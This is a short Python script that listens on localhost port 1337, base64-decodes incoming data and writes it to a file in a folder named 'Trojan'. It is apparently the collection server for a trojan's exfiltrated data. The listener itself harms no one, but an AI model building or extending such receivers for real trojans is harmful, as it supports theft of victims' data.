import socket
import base64
import random
from string import ascii_lowercase
import os

def generate_random_filename():
    
    filepath = "C:\\Users\\PAMSTORE\\Desktop\\Trojan\\Trojan\\dmnyhftysk"
    
    """
        Ensure a single file is used and updated
    """
    
    # Check if the file already exists
    if not os.path.exists(filepath):
        
        # Create the file if it doesn't exist
        with open(filepath, "a+") as f:
            f.write("")  # Initialize with empty content
            
    return filepath


def main():
    # Create TCP socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Listen on localhost port 1337
    try:
        server_socket.bind(("127.0.0.1", 1337))
        server_socket.listen(5)
        print("Listening on port 1337...")
        
    except Exception as e:
        print(f"Failed to bind or listen on port 1337: {e}")
        return

    while True:
        try:
            # Establish a connection
            client_socket, client_address = server_socket.accept()
            print(f"[+] Received a connection from -> {client_address}")

            # Receive the encoded data
            encoded_data = client_socket.recv(4096)
            client_socket.close()

            # Decode and save the data to a file
            try:
                decoded_data = base64.b64decode(encoded_data).decode("UTF-8")
                filename = generate_random_filename()
                with open(filename, "w", encoding="utf-8") as random_fd:
                    random_fd.write(decoded_data)
                print(f"Data saved to file: {filename}")
            except Exception as e:
                print(f"Failed to decode or write data: {e}")

        except Exception as e:
            print(f"Error during client connection: {e}")
        finally:
            # Ensure the client socket is always closed
            client_socket.close()

if __name__ == "__main__":
    main()
